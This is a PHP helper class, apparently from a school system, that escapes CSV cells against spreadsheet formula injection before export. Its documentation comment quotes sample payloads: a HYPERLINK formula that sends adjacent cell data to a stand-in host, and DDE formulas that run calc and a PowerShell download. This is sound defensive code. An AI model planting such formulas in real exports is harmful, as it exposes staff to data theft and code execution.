<?php

namespace App\Support;

/**
 * The one place a CSV row is written, so the one place formula injection is
 * stopped.
 *
 * ## The problem
 *
 * A CSV is a text file, but Excel, LibreOffice and Google Sheets do not open
 * it as one. A cell whose first character is `=`, `+`, `-`, `@`, a tab or a
 * carriage return is parsed as a **formula**, and the file's author decides
 * what that formula does. The classic payloads are worth naming, because they
 * are not theoretical:
 *
 *   =HYPERLINK("https://elsewhere/?x="&A1,"Click for marks")
 *   =cmd|'/c calc'!A0
 *
 *   @SUM(1+9)*cmd|'/c powershell IEX(...)'!A0
 *
 * The first exfiltrates the row beside it to whoever wrote the name; the other
 * two are DDE, which still prompts on a default Excel install and which
 * office staff click through because the file came from their own school
 * system.
 *
 * ## Why this school is a good target for it
 *
 * Almost everything in these exports is typed by somebody. A student's name, a
 * behaviour note, a book title, a leave reason, a guardian's address — all
 * free text, all reaching a spreadsheet on a member of staff's machine. A
 * parent who can set their own child's name on a registration form can put a
 * formula in a report that the finance office opens.
 *
 * ## The fix, and why it is this one
 *
 * A leading apostrophe is the usual answer and it is wrong: it is invisible in
 * Excel but a literal character everywhere else, so every downstream importer
 * sees `'Ahmed`. This prefixes a **tab** instead, which every spreadsheet
 * treats as "this is text" and which strips cleanly.
 *
 * Values that are unambiguously numbers are left alone — a negative amount is
 * `-450`, not a formula, and quoting every number would make the money columns
 * useless for the sums these files exist to support.
 *
 * ## Use it for every row
 *
 * `tests/Architecture/CsvWritesAreEscapedTest.php` fails on a raw `fputcsv`
 * anywhere in `app/`. Header rows go through it too: a header is only safe
 * because today's literals happen to be safe, and that is not a property worth
 * relying on per call site.
 */
class Csv
{
    /**
     * The characters a spreadsheet reads as "a formula starts here".
     *
     * Tab and carriage return are in the list because a leading one can shift
     * the parse onto the next character, which is how a payload gets past a
     * naive check for `=` alone.
     */
    private const TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /**
     * Write one row, escaping every cell.
     *
     * @param  resource  $handle
     * @param  array<int, mixed>  $row
     */
    public static function put($handle, array $row): void
    {
        fputcsv($handle, array_map(static fn ($value) => self::cell($value), $row));
    }

    /**
     * One cell, made safe to open in a spreadsheet.
     */
    public static function cell(mixed $value): string
    {
        if ($value === null || $value === false) {
            return '';
        }

        if ($value === true) {
            return '1';
        }

        if (is_int($value) || is_float($value)) {
            return (string) $value;
        }

        $text = (string) $value;

        if ($text === '') {
            return '';
        }

        // A number is a number. `-450` and `+9607820288` are not formulas, and
        // quoting them would break the sums these exports exist for. Anything
        // with a trigger character *after* the sign is not a number and falls
        // through to the escape below.
        if (is_numeric($text)) {
            return $text;
        }

        return in_array($text[0], self::TRIGGERS, true) ? "\t".$text : $text;
    }
}
